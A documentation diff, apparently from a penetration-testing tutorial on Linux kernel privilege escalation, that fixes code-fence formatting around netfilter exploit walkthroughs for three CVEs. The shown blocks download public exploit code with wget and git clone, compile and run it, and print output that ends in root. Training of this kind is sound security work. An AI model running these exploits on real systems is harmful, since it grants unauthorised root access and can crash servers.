@@ -20,15 +20,13 @@ Even if the company uses virtual machines or containers like Docker, these are b
 
 Vulnerable kernel versions: 2.6 - 5.11
 
-```
-        shellsession
+```shellsession
 cry0l1t3@ubuntu:~$ uname -r
 
 5.10.5-051005-generic
 ```
 
-```
-        shellsession
+```shellsession
 cry0l1t3@ubuntu:~$ wget https://raw.githubusercontent.com/google/security-research/master/pocs/linux/cve-2021-22555/exploit.c
 cry0l1t3@ubuntu:~$ gcc -m32 -static exploit.c -o exploit
 cry0l1t3@ubuntu:~$ ./exploit
@@ -59,8 +57,7 @@ uid=0(root) gid=0(root) groups=0(root)
 
 A recent vulnerability is [CVE-2022-25636](https://www.cvedetails.com/cve/CVE-2022-25636/) and affects Linux kernel 5.4 through 5.6.10. This is `net/netfilter/nf_dup_netdev.c`, which can grant root privileges to local users due to heap out-of-bounds write. `Nick Gregory` wrote a very detailed [article](https://nickgregory.me/post/2022/03/12/cve-2022-25636/) about how he discovered this vulnerability.
 
-```
-        shellsession
+```shellsession
 cry0l1t3@ubuntu:~$ uname -r
 
 5.13.0-051300-generic
@@ -68,8 +65,7 @@ cry0l1t3@ubuntu:~$ uname -r
 
 However, we need to be careful with this exploit as it can corrupt the kernel, and a reboot will be required to reaccess the server.
 
-```
-        shellsession
+```shellsession
 cry0l1t3@ubuntu:~$ git clone https://github.com/Bonfee/CVE-2022-25636.git
 cry0l1t3@ubuntu:~$ cd CVE-2022-25636
 cry0l1t3@ubuntu:~$ make
@@ -107,8 +103,7 @@ The exploitation is done by manipulating the system to use the `cleared out` ano
 
 #### Proof-Of-Concept
 
-```
-        shellsession
+```shellsession
 cry0l1t3@ubuntu:~$ git clone https://github.com/Liuk3r/CVE-2023-32233
 cry0l1t3@ubuntu:~$ cd CVE-2023-32233
 cry0l1t3@ubuntu:~/CVE-2023-32233$ gcc -Wall -o exploit exploit.c -lmnl -lnftnl
@@ -116,8 +111,7 @@ cry0l1t3@ubuntu:~/CVE-2023-32233$ gcc -Wall -o exploit exploit.c -lmnl -lnftnl
 
 #### Exploitation
 
-```
-        shellsession
+```shellsession
 cry0l1t3@ubuntu:~/CVE-2023-32233$ ./exploit
 
 [*] Netfilter UAF exploit
